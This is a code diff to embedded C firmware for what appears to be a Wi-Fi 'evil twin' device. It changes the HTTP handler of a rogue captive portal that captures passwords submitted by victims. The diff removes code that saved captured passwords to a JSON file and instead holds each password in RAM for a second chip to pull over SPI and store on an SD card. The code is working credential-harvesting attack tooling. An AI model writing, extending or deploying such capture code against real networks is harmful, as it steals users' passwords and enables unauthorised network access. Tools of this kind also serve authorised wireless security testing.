@@ -158,44 +158,13 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
   char password[MAX_PASSWORD_LEN] = {0};
   if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
+    // Keep the captured password in RAM only. The P4 pulls it over SPI
+    // (SPI_ID_WIFI_EVIL_TWIN_GET_PASSWORD) and persists it on its SD; the C5
+    // does not write captures to its own storage.
     strncpy(s_last_password, password, sizeof(s_last_password) - 1);
     s_last_password[sizeof(s_last_password) - 1] = '\0';
     s_has_password = true;
-
-    if (xSemaphoreTake(s_storage_mutex, pdMS_TO_TICKS(STORAGE_MUTEX_TIMEOUT_MS)) == pdTRUE) {
-      cJSON *root_array = NULL;
-
-      size_t size = 0;
-      char *existing_json = (char *)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
-
-      if (existing_json != NULL) {
-        root_array = cJSON_Parse(existing_json);
-        free(existing_json);
-      }
-
-      if (root_array == NULL) {
-        root_array = cJSON_CreateArray();
-      }
-
-      cJSON *entry = cJSON_CreateObject();
-      cJSON_AddStringToObject(entry, "user", "");
-      cJSON_AddStringToObject(entry, "password", password);
-      cJSON_AddStringToObject(entry, "2fa", "");
-      cJSON_AddStringToObject(entry, "token", "");
-      cJSON_AddItemToArray(root_array, entry);
-
-      char *output = cJSON_PrintUnformatted(root_array);
-      if (output != NULL) {
-        storage_write_string(PATH_PASSWORDS_ABS, output);
-        free(output);
-      }
-      cJSON_Delete(root_array);
-
-      xSemaphoreGive(s_storage_mutex);
-      ESP_LOGI(TAG, "Password successfully saved to JSON");
-    } else {
-      ESP_LOGE(TAG, "Timeout when attempting to obtain Mutex to save password");
-    }
+    ESP_LOGI(TAG, "Password captured (held in RAM for P4 pull)");
   }
 
   size_t size = 0;
